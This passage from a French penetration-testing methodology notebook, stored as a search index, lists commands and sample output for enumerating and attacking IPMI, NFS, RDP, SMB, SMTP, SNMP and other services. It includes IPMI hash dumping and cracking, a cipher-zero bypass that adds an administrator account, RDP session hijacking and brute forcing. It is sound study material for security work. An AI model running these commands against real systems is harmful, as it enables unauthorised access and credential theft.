ADMIN"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#ipmi-20-password-hash-grabbing","title":"IPMI 2.0 Password Hash grabbing","text":"<p>Any valid username can lead to grabbing from the server the salted SHA1 or MD5 password of that user. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command\u00a0<code>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</code>\u00a0which tries all combinations of upper case letters and numbers for an eight-character password.</p> <p>It can then be cracked offline using <code>hashcat</code> with <code>mode 7300</code></p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#getting-the-hash-using-metasploit","title":"Getting the Hash using Metasploit","text":"<p>IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval</p> <pre><code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes \nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.129.42.195\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_dumphashes):\n\n   Name                 Current Setting                                                    Required  Description\n   ----                 ---------------                                                    --------  -----------\n   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained\n   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format\n   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format\n   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line\n   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'\n   RPORT                623                                                                yes       The target port\n   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)\n   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line\n\n\n\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run\n\n[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e\n[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#cracking-the-hash","title":"Cracking the hash","text":"<pre><code>$ john -w=/usr/share/wordlists/rockyou.txt ipmi.john \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\ntrinity          (10.129.190.51 admin)      &lt;====================================== \n1g 0:00:00:03 DONE (2023-04-27 19:03) 0.2538g/s 3640Kp/s 3673Kc/s 3673KC/s -xlengx-..*7\u00a1Vamos!\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#authenticating-without-password","title":"Authenticating without password","text":"<p>If you know a valid username, you might authenticate without password</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#check-if-host-is-vulnerable","title":"Check if host is vulnerable","text":"<pre><code> sudo nmap -n -Pn -sU -T5 $TARGET_IP -p 623 --script ipmi-cipher-zero           \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 21:08 BST\nNmap scan report for 10.129.181.223\nHost is up (0.023s latency).\n\nPORT    STATE SERVICE\n623/udp open  asf-rmcp\n| ipmi-cipher-zero: \n|   VULNERABLE:\n|   IPMI 2.0 RAKP Cipher Zero Authentication Bypass\n|     State: VULNERABLE\n|     Risk factor: High\n|       \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#exploitation","title":"Exploitation","text":"<pre><code>$ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user list          \nIANA PEN registry open failed: Aucun fichier ou dossier de ce type\nID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit\n1                    true    false      false      USER\n2   ceil             true    false      true       ADMINISTRATOR\n3                    true    false      false      Unknown (0x00)\n4                    true    false      false      Unknown (0x00)\n[...]\n</code></pre> <p>Creation of a new administrator user with known password</p> <pre><code>$ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user set name 4 rebrec \n$ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user set password 4 rebrec\n$ ipmitool -I lanplus -H $TARGET_IP -C 0  -U ceil -P whateverpassword user set priv 4 4\n</code></pre> <p>We can then try to connect through the web interface and interact with the console</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/","title":"NFS","text":"<p>Ports : 111 (RPC), 2049 (NFS)</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#remarque","title":"Remarque","text":"<p>Si des partages sont d\u00e9couvert et que l'option <code>no_root_squash</code> a \u00e9t\u00e9 utilis\u00e9e, on pourra en tant que root, uploader des binaires setuid root ! Cela ne fonctionne pas si <code>root_squash</code> a \u00e9t\u00e9 param\u00e9tr\u00e9</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#rpc-info","title":"rpc info","text":"<pre><code>rpcinfo inlanefreight.htb\nnmap -sSUC -p111 $TARGET\n\n# via un pivot \nproxychains -q nmap -n -Pn -sT -p 111 --script rpcinfo,nfs-showmount 172.16.8.20\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#nmap","title":"nmap","text":"<pre><code># enumeration de la version et du script rpcinfo\nsudo nmap -Pn $TARGET -p111,2049 -sV -sC\n\n# usage de tous les scripts NFS (nfs-ls, nfs-showmount, nfs-statfs, rpcinfo)\nsudo nmap --script nfs* $TARGET_IP -sV -p111,2049\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#liste-des-partages-nfs","title":"liste des partages NFS","text":"<pre><code>$ showmount -e $TARGET_IP\n\nExport list for 10.129.14.128:\n/mnt/nfs 10.129.14.0/24\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#montage-dun-partage-nfs","title":"Montage d'un partage NFS","text":"<pre><code>mkdir target-NFS\nsudo mount -t nfs $TARGET_IP:/Remote_Share ./target-NFS/ -o nolock\ncd target-NFS\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#demontage-dun-partage-nfs-hors-ligne","title":"D\u00e9montage d'un partage NFS hors ligne","text":"<p>Si le serveur ne r\u00e9pond plus on pourra utiliser :</p> <pre><code>umount -f -l /mnt/monDossier\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#lister-le-contenu-du-dossier-avec-les-uids-et-gids","title":"Lister le contenu du dossier avec les UIDs et GIDs","text":"<pre><code>$ ls -n \ntotal 16\n-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 aze.priv\n-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 aze.pub\n-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 dds.sh\n-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#obtenir-le-bon-uid","title":"Obtenir le bon UID","text":"<pre><code>$ sudo su -s /bin/bash &lt;username&gt;\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#creation-dun-utilisateur-avec-un-uid-specifique","title":"Cr\u00e9ation d'un utilisateur avec un UID sp\u00e9cifique","text":"<pre><code>useradd -u 1234 &lt;username&gt;\npasswd &lt;username&gt;\nsudo su &lt;username&gt;\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#solution-alternative-nfsshell","title":"Solution alternative : nfsshell","text":"<p>Cette solution permet d'\u00e9muler les uid et gid de notre choix</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#installation","title":"installation","text":"<pre><code>https://github.com/NetDirect/nfsshell\nTutorial : \nhttps://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/NFS/#solution-alternative-non-testee-nfspy","title":"Solution alternative (non test\u00e9e ) :  NfSpy","text":"<p>https://github.com/bonsaiviking/NfSpy</p> <p>https://malicious.link/posts/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/</p> <pre><code>yay -S nfspy\n\nproxychains nfspy -d -o server=172.16.2.20:/,nfsport=2049/tcp,mountport=2049/tcp,ro /mnt/DEV01\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/R-Services/","title":"R Services","text":"<p>Ports :</p> <ul> <li>512/tcp</li> <li>513/tcp</li> <li>514/tcp</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/R-Services/#r-commandes","title":"R-commandes","text":"<ul> <li>rcp (<code>remote copy</code>)</li> <li>rexec (<code>remote execution</code>)</li> <li>rlogin (<code>remote login</code>)</li> <li>rsh (<code>remote shell</code>)</li> <li>rstat</li> <li>ruptime</li> <li>rwho (<code>remote who</code>)</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/R-Services/#authentification","title":"Authentification","text":"<p>Il suffit qu'une entr\u00e9e soit pr\u00e9sente dans <code>/etc/hosts.equiv</code> ou dans <code>.rhosts</code> pour se voir accorder l'autorisation</p> <pre><code>$ cat /etc/hosts.equiv\n\n# &lt;hostname&gt; &lt;local username&gt;\nmyremotehost rebrec\n</code></pre> <pre><code>$ cat .rhosts\n\njohn     10.0.17.5               &lt;=== l'hote 10.0.17.5 peut se loguer en tant que john\n+               10.0.17.10       &lt;=== peut se loguer en tant que n'importe quel user\n+               +                 &lt;=== n'importe qui peut se loguer ...\n</code></pre> <pre><code>$ rlogin 10.0.17.2 -l michel\n\nLast login: Fri Dec  2 16:11:21 from localhost\n\n[michel@localhost ~]$\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/R-Services/#lister-les-utilisateurs-connecte-au-serveur","title":"Lister les utilisateurs connect\u00e9 au serveur","text":"<pre><code>$ rwho\n\nroot     web01:pts/0 Dec  2 21:34\nmichel     workstn01:tty1  Dec  2 19:57  2:25 \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/RDP/","title":"RDP","text":"<p>Port : 3389/tcp</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/RDP/#enumeration","title":"Enumeration","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/RDP/#nmap","title":"Nmap","text":"<pre><code>nmap -sV -sC $TARGET_IP -p3389 --script rdp*\n\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-enum-encryption: \n|   Security layer\n|     CredSSP (NLA): SUCCESS\n|     CredSSP with Early User Auth: SUCCESS\n|_    RDSTLS: SUCCESS\n| rdp-ntlm-info: \n|   Target_Name: ILF-SQL-01\n|   NetBIOS_Domain_Name: ILF-SQL-01\n|   NetBIOS_Computer_Name: ILF-SQL-01\n|   DNS_Domain_Name: ILF-SQL-01\n|   DNS_Computer_Name: ILF-SQL-01\n|   Product_Version: 10.0.17763\n|_  System_Time: 2021-11-06T13:46:00+00:00\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>Outil permettant d'identifier les param\u00e8tres de s\u00e9curit\u00e9 d'un serveur RDP sans s'authentifier</p> <p>https://github.com/CiscoCXSecurity/rdp-sec-check</p> <pre><code>$ sudo cpan\ncpan[1]&gt; install Encoding::BER\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/RDP/#rdp-security-check","title":"RDP Security Check","text":"<pre><code>$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check\n$ ./rdp-sec-check.pl 10.129.201.248\n[+] Scanning 1 hosts\n\nTarget:    10.129.201.248\nIP:        10.129.201.248\nPort:      3389\n\n[+] Checking supported protocols\n\n[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER\n[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER\n[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported\n\n[+] Checking RDP Security Layer\n\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported\n[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported\n\n[+] Summary of protocol support\n\n[-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE\n[-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE\n[-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE\n\n[+] Summary of RDP encryption support\n\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE\n[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE\n\n[+] Summary of security issues\n\n\nrdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/RDP/#connexion-rdp-depuis-linux","title":"Connexion RDP depuis linux","text":"<p>Clients : <code>xfreerdp</code>,\u00a0<code>rdesktop</code>, ou\u00a0<code>Remmina</code></p> <p>```shell-session</p> <p>xfreerdp /u:$AD_USER /p:$AD_PASSWORD /v:$TARGET_IP /drive:shareName,/tmp /size:1900x900 </p> <p>rdesktop -u $AD_USER -p $AD_PASSWORD $TARGET_IP</p> <pre><code>## Attaques / Exploitations\n\n### Exploits\n\n- Bluekeep (fix en 2019)\n\n### Brute force RDP avec Hydra\n\n\u00a0```\n\nhydra -L user.list -P password.list rdp://$TARGET_IP\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/RDP/#rdp-session-hijacking","title":"RDP Session Hijacking","text":"<p>Objectif : basculer sur une session RDP d'une autre session RDP (sans saisie de mot de passe) Pr\u00e9requis : \u00eatre administrateur local (pour pouvoir devenir SYSTEM)</p> <pre><code># On r\u00e9cup\u00e8re sa session active et celle que l'on souhaite hijacker\n\nquery user\n\n USERNAME              SESSIONNAME       ID  STATE   IDLE TIME  LOGON TIME\n\n&gt;attacker              rdp-tcp#1          1  Active          7  8/25/2021 1:23 AM\n lewen                 rdp-tcp#2          2  Active          *  8/25/2021 1:28 AM\n\n# Creation d'un service qui lancera TSCON.EXE en tant que SYSTEM\n## tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}\n\nsc.exe create sessionhijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#1\"\n\n# Lancement du service\n\nnet start sessionhijack\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/RDP/#rdp-pass-the-hash","title":"RDP Pass the Hash","text":"<p>xfreerdp peut faire du PtH. Il est toutefois n\u00e9cessaire de d\u00e9sactiver un m\u00e9canisme de s\u00e9curit\u00e9 via la base de registre. Voir : [[Pass The Hash (PtH)]]</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/Rsync/","title":"Rsync","text":"<p>Port : 873/tcp</p> <p>Pentesting guide : https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/Rsync/#enumeration","title":"Enumeration","text":"<pre><code>sudo nmap -sV -p 873 127.0.0.1\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/Rsync/#tenter-de-lister-des-partages-accessibles","title":"Tenter de lister des partages accessibles","text":"<p>Selon la configuration de rsync il est potentiellement possible de r\u00e9cup\u00e9rer des donn\u00e9es sans s'authentifier :</p> <pre><code>rebrec@htb[/htb]$ nc -nv 127.0.0.1 873\n\n(UNKNOWN) [127.0.0.1] 873 (rsync) open\n@RSYNCD: 31.0\n@RSYNCD: 31.0\n#list\ndev             Dev Tools       &lt;============ ON A LE PARTAGE DEV QUI EST VISIBLE\n@RSYNCD: EXIT\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/Rsync/#enumerer-un-partage-ouvert","title":"Enum\u00e9rer un partage ouvert","text":"<pre><code>$ rsync -av --list-only rsync://127.0.0.1/dev         &lt;== PARTAGE DEV\n\nreceiving incremental file list\ndrwxr-xr-x             48 2022/09/19 09:43:10 .\n-rw-r--r--              0 2022/09/19 09:34:50 build.sh\n-rw-r--r--              0 2022/09/19 09:36:02 secrets.yaml\ndrwx------             54 2022/09/19 09:43:10 .ssh\n\nsent 25 bytes  received 221 bytes  492.00 bytes/sec\ntotal size is 0  speedup is 0.00\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/Rsync/#telecharger-le-contenu-du-partage","title":"T\u00e9l\u00e9charger le contenu du partage","text":"<pre><code>rsync -av rsync://127.0.0.1/dev\n</code></pre> <p>Si rsync est configur\u00e9 pour utiliser SSH pour transf\u00e9rer les fichiers, on peut ajouter <code>-e ssh</code> ou <code>-e \"ssh -p1234\"</code> (voir https://phoenixnap.com/kb/how-to-rsync-over-ssh)</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/","title":"SMB","text":"<p>Ports : 135, 137, 139, 445</p> <p>CIFS est une impl\u00e9mentation de SMB</p> <p>Port CIFS : 445 exclusivement</p> <p>On peut obtenir des informations sur des partages, des utilisateurs, des groupes, etc.</p> <p>Voir aussi : [[docs/_M\u00e9thodologie/1-Enum\u00e9ration/Windows/Distante/Active Directory/Active Directory - SMB]]</p> <p>Cheatsheet du SANS : https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf</p> <pre><code>$ sudo nmap $TARGET  -sV -sC -p139,445\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#rpcclient","title":"rpcclient","text":"<pre><code>$ rpcclient -U \"\" $TARGET_IP \n\nEnter WORKGROUP\\'s password:\nrpcclient $&gt; \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#commandes-utiles","title":"commandes utiles","text":"<pre><code>rpcclient $&gt; srvinfo\n\n        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM\n        platform_id     :       500\n        os version      :       6.1\n        server type     :       0x809a03\n\n\nrpcclient $&gt; enumdomains\n\nname:[DEVSMB] idx:[0x0]\nname:[Builtin] idx:[0x1]\n\n\nrpcclient $&gt; querydominfo\n\nDomain:         DEVOPS\nServer:         DEVSMB\nComment:        DEVSM\nTotal Users:    2\nTotal Groups:   0\nTotal Aliases:  0\nSequence No:    1632361158\nForce Logoff:   -1\nDomain Server State:    0x1\nServer Role:    ROLE_DOMAIN_PDC\nUnknown 3:      0x1\n\n\nrpcclient $&gt; netshareenumall\n\nnetname: print$\n        remark: Printer Drivers\n        path:   C:\\var\\lib\\samba\\printers\n        password:\nnetname: home\n        remark: INFREIGHT Samba\n        path:   C:\\home\\\n        password:\nnetname: dev\n        remark: DEVenv\n        path:   C:\\home\\sambauser\\dev\\\n        password:\nnetname: notes\n        remark: CheckIT\n        path:   C:\\mnt\\notes\\\n        password:\nnetname: IPC$\n        remark: IPC Service (DEVSM)\n        path:   C:\\tmp\n        password:\n\n\nrpcclient $&gt; netsharegetinfo notes\n\nnetname: notes\n        remark: CheckIT\n        path:   C:\\mnt\\notes\\\n        password:\n        type:   0x0\n        perms:  0\n        max_uses:       -1\n        num_uses:       1\nrevision: 1\ntype: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE \nDACL\n        ACL     Num ACEs:       1       revision:       2\n        ---\n        ACE\n                type: ACCESS ALLOWED (0) flags: 0x00 \n                Specific bits: 0x1ff\n                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS \n                SID: S-1-1-0\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#user-enumeration","title":"User enumeration","text":"<pre><code># user list\nrpcclient $&gt; enumdomusers\n\nuser:[mrb3n] rid:[0x3e8]\nuser:[cry0l1t3] rid:[0x3e9]\n\n# user details\nrpcclient $&gt; queryuser 0x3e9\n\n# user list WHEN enumdomusers is not allowed (bruteforce works generally)\n$ for i in $(seq 500 1100);do rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#group-enumeration","title":"Group enumeration","text":"<pre><code># rpcclient\nrpcclient $&gt; enumdomgroups\n[...]\ngroup:[WebDevs] rid:[0x64e]\n\nrpcclient $&gt; querygroup 0x64e\n        Group Name:     WebDevs\n        Description:\n        Group Attribute:7\n        Num Members:1\n\nrpcclient $&gt; querygroupmem 0x64e\n        rid:[0x647] attr:[0x7]\n\nrpcclient $&gt; queryuser 0x647\n        User Name   :   C.Bum\n        Full Name   :\n        Home Drive  :\n        Dir Drive   :\n        Profile Path:\n        Logon Script:\n        Description :   Senior Web Developer\n        Workstations:\n[...]\n\n# enum4linux\nenum4linux -u $AD_USER -p \"$AD_PASSWORD\" -G $TARGET_IP \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#impacket-samrdumppy","title":"Impacket : samrdump.py","text":"<pre><code>$ samrdump.py 10.129.14.128\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#smbmap","title":"smbmap","text":"<pre><code># Auth Null Session\nsmbmap -H $TARGET\n\n# Liste des partages\nsmbmap -u $AD_USER -p $AD_PASSWORD -H $TARGET_IP\n\n# Liste de fa\u00e7on r\u00e9cursive les fichiers d'un partage (indique si les droits sont en \u00e9criture ou en lecture)\nsmbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R \"$SHARE/\"\n\n#  Liste r\u00e9cusive d'un partage :\nsmbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -r \"$SHARE\"\n\n# T\u00e9l\u00e9chargement d'un fichier \nsmbmap -u \"\" -p \"\" -H $TARGET_IP --download  \"sambashare\\contents\\flag.txt\"\n\n# Upload d'un fichier \nsmbmap -u \"\" -p \"\" -H $TARGET_IP --upload file.txt \"sambashare\\file.txt\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#crackmapexec","title":"CrackMapExec","text":"<pre><code>$ crackmapexec smb $TARGET_IP --shares -u '' -p ''\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#enum4linux","title":"enum4linux","text":"<pre><code># lots of output\n$ enum4linux $TARGET -A\n$ enum4linux-ng $TARGET -A\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#smbclient","title":"smbclient","text":"<pre><code>$ smbclient -N -L //$TARGET_IP\n$ smbclient //$TARGET_IP/notes\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#telechargement-recursif-dun-dossier","title":"T\u00e9l\u00e9chargement r\u00e9cursif d'un dossier","text":"<pre><code>smbclient //$TARGET_IP/Share\nRECURSE ON\nPROMP OFF\nmget *\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMB/#smbclientpy-impacket","title":"smbclient.py (impacket)","text":"<pre><code>smbclient.py \"$AD_USER:$AD_PASSWORD@$TARGET_IP\"\nsmbclient.py \"$AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP\"\n\n# Affichage de l'arborescence d'un dossier\ntree\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMTP/","title":"SMTP","text":"<p>Ports :</p> <ul> <li>25 (non chiffr\u00e9)</li> <li>465 (chiffr\u00e9)</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMTP/#enumeration","title":"Enumeration","text":"<pre><code>sudo nmap -Pn -sV -sC -p25,465 $TARGET\nsudo nmap -Pn -sC -p25 --script smtp-open-relay $TARGET\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMTP/#exploitation","title":"Exploitation","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMTP/#enumeration-dutilisateurs","title":"Enum\u00e9ration d'utilisateurs","text":"<p>Peut \u00eatre utilis\u00e9 pour \u00e9num\u00e9rer des comptes utilisateurs valides via les param\u00e8tres <code>VRFY</code>, <code>EXPN</code> et <code>RCPT TO</code></p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMTP/#automatisee","title":"Automatis\u00e9e","text":"<p>[[Enum\u00e9ration d'utilisateurs \u00e0 distance via la messagerie]]</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMTP/#manuelle","title":"Manuelle","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMTP/#vrfy","title":"VRFY","text":"<pre><code>telnet $TARGET_IP 25\n[...]\nVRFY root\n\n252 2.0.0 root\n\nVRFY rebrec\n\n550 5.1.1 &lt;rebrec&gt;: Recipient address rejected: User unknown in local recipient table\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMTP/#expn","title":"EXPN","text":"<p>Peut afficher la liste des membres d'une liste de distribution.</p> <pre><code>telnet  $TARGET_IP 25\n[...]\nEXPN existinguser\n\n250 2.1.0 existinguser@superdomain.com\n\n\nEXPN company-members\n\n250 2.0.0 existinguser@superdomain.com\n250 2.1.5 existinguser1@superdomain.com\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SMTP/#rcpt-to","title":"RCPT TO","text":"<pre><code>telnet $TARGET_IP 25\n[...]\nMAIL FROM:test@mydomain.com\n\n250 2.1.0 test@mydomain.com... Sender ok\n\n\nRCPT TO:baduser1\n\n550 5.1.1 baduser1... User unknown\n\n\nRCPT TO:baduser2\n\n550 5.1.1 baduser2... User unknown\n\n\nRCPT TO:existinguser\n\n250 2.1.5 existinguser... Recipient ok\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SNMP/","title":"SNMP","text":"<p>Ports</p> <ul> <li>161 (agents)</li> <li>162 (traps)</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SNMP/#brute-force-de-la-communaute-snmp","title":"Brute force de la communaut\u00e9 SNMP","text":"<pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $TARGET\n\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $TARGET\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SNMP/#parcours-dune-partie-de-larborescence","title":"Parcours d'une partie de l'arborescence","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SNMP/#snmpwalk","title":"snmpwalk","text":"<pre><code>snmpwalk -v 2c -c public $TARGET 1.3.6.1.2.1.1.5.0\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SNMP/#braa","title":"braa","text":"<pre><code>braa public@\"$TARGET\":.1.3.6.*\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SSH/","title":"SSH","text":"<p>Port : 22/tcp</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SSH/#enumeration","title":"Enumeration","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SSH/#ssh-audit","title":"SSH-Audit","text":"<pre><code>git clone https://github.com/jtesta/ssh-audit.git &amp;&amp; cd ssh-audit\n./ssh-audit.py $TARGET_IP\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SSH/#change-authentication-method","title":"Change authentication method","text":"<pre><code>ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/SSH/#brute-force-avec-hydra","title":"Brute force avec hydra","text":"<pre><code> hydra -L user.list -P 